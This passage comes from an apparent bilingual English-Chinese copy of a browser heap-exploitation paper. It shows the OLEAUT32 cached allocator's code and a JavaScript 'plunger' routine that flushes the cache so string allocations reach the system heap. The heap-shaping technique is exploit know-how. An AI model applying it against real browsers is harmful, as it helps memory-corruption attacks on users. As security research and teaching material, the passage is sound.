style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_257_32768;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else if (size &gt; 64)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>       </span><span style='mso-spacerun:yes'> </span>bin = &amp;this-&gt;bin_65_256;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else if (size &gt; 32)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_33_64;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_1_32;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Iterate through all entries in the bin<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>for (i = 0; i &lt; 6; i++) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// If the cached block is big enough, use it for this allocation<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>if (bin[i].size &gt;= size) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>bin[i].size = 0;<span style='mso-spacerun:yes'>        </span>// Size 0 means the cache entry is unused<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>return bin[i].ptr;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>system_alloc:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Allocate memory using the system memory allocator<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>return HeapAlloc(GetProcessHeap(), 0, size);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Free memory and keep freed blocks in the cache<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>void APP_DATA::FreeCachedMem(void* ptr)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry* bin;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry* entry;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>unsigned int min_size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>int i;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (g_fDebNoCache == TRUE)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>goto system_free;<span style='mso-spacerun:yes'>           </span>// Use HeapFree if caching is disabled<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Get the size of the block we're freeing<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>size = HeapSize(GetProcessHeap(), 0, ptr);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Find the right cache bin for the size<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (size &gt; 32768)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>goto system_free;<span style='mso-spacerun:yes'>           </span>// Use HeapFree for large blocks<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else if (size &gt; 256)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_257_32768;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else if (size &gt; 64)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_65_256;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else if (size &gt; 32)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_33_64;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>else<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>bin = &amp;this-&gt;bin_1_32;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Iterate through all entries in the bin and find the smallest one<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>min_size = size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>entry = NULL;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>for (i = 0; i &lt; 6; i++) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// If we find an unused cache entry, put the block there and return<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>if (bin[i].size == 0) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>bin[i].size = size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>bin[i].ptr = ptr;<span style='mso-spacerun:yes'>       </span>// The free block is now in the cache<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>return;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// If the block we're freeing is already in the cache, abort<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>if (bin[i].ptr == ptr)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span><span style='mso-spacerun:yes'>        </span>return;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>// Find the smallest cache entry<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>if (bin[i].size &lt; min_size) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>min_size = bin[i].size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>entry = &amp;bin[i];<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// If the smallest cache entry is smaller than our block, free the cached<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// block with HeapFree and replace it with the new block<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (min_size &lt; size) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>HeapFree(GetProcessHeap(), 0, entry-&gt;ptr);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>entry-&gt;size = size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>entry-&gt;ptr = ptr;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>return;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>system_free:<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Free the block using the system memory allocator<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>return HeapFree(GetProcessHeap(), 0, ptr);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
caching alrogithm used by the APP_DATA memory allocator presents a problem,
because only some of our allocations and frees result in calls to the system
allocator.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>上面讨论的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>APP_DATA</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>所使用的内存分配算法揭示了一个问题：在我们申请和释放的内存块中只有一部分会调用系统的堆内存分配函数。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><a name=plunger></a><span lang=EN-US style='font-size:9.5pt;font-family:
Verdana'>Plunger technique<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>绕过</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'>OLEAUT32</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana'>的缓存机制</span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
make sure that each string allocation comes from the system heap, we need to
allocate 6 blocks of the maximum size for each bin. Since the cache can hold only
6 blocks in a bin, this will make sure that all cache bins are empty. The next
string allocation is guaranteed to result in a call to HeapAlloc().<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>为了确保我们要分配的所有</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象都能够通过系统堆内存分配函数真正从堆中分配空间，我们需要把</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>APP_DATA</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的缓存中</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>4</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个项都清空掉（记第</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>n</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个项可写入的最大内存块的尺寸为</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>Max<sub>n</sub></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>）。因为缓存的各个项都只能容纳</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>6</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个内存块，所以我们可以通过为每个项分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>6</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Max<sub>n</sub></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>大小的内存块的方式来达到这一目的。这样就保证以后我们要分配的每个</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象所需的内存空间都是用</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>HeapAlloc()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>分配出来的。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p class=MsoNormal><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'>If we free the string we just allocated, it will go into one of
the cache bins. We can flush it out of the cache by freeing the 6 maximum-size
blocks that we allocated in the previous step. The FreeCachedMem() function
will push all smaller blocks out of the cache, and our string will be freed
with HeapFree(). At this point, the cache will be full, so we need to empty it
again by allocating 6 maximum-size blocks for each bin.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>当我们释放刚才我们分配的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象的内存空间时，因为缓存中相应的项已经被清空了，所以它一定会进入缓存中相应的项（第</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>n</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个项），这时我们可以通过再释放</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>6</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Max<sub>n</sub></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>大小的内存块的方式来把我们的</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象“挤”出缓存。这样</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象所占的空间就会被</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HeapFree()</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>回收。当然这时，缓存也就被填满了，所以再要分配</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>6</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Max<sub>n</sub></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>大小的内存块来清空缓存中这个项。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>In
effect, we are using the 6 blocks as a plunger to push out all smaller blocks
out of the cache, and then we pull the plunger out by allocating the 6 blocks
again.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>（这一节是刚才那些话的重复，不译）</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
following code shows an implementation of the plunger technique:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面是这一技术的实现代码：</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>plunger = new Array();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// This function flushes out all blocks in the cache and leaves it empty<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>function flushCache() {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Free all blocks in the plunger array to push all smaller blocks out<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>plunger = null;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CollectGarbage();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Allocate 6 maximum size blocks from each bin and leave the cache empty<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>plunger = new Array();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>for (i = 0; i &lt; 6; i++) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>plunger.push(alloc(32));<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>plunger.push(alloc(64));<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>plunger.push(alloc(256));<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>plunger.push(alloc(32768));<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>flushCache();<span style='mso-spacerun:yes'>           </span>// Flush the cache before doing any allocations<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>alloc_str(0x200);<span style='mso-spacerun:yes'>       </span>// Allocate the string<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>free_str();<span style='mso-spacerun:yes'>             </span>// Free the string and flush the cache<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>flushCache();<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
push a block out of the cache and free it with HeapFree(), it must be smaller
than the maximum size for its bin. Otherwise, the condition </span><span
class=code><span lang=EN-US style='font-size:9.0pt;color:#404040'>min_size &lt;
size</span></span><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;
color:#404040'> in FreeCachedMem will not be satisfied and the plunger block
will be freed instead. This means that we cannot free blocks of size 32, 64,
256 or 32768, but this is not a serious limitation.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>当然为了保证这一技术的有效性，</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象的大小必须要小于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Max<sub>n</sub></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>，否则</span><span lang=EN-US style='font-size:9.5pt;
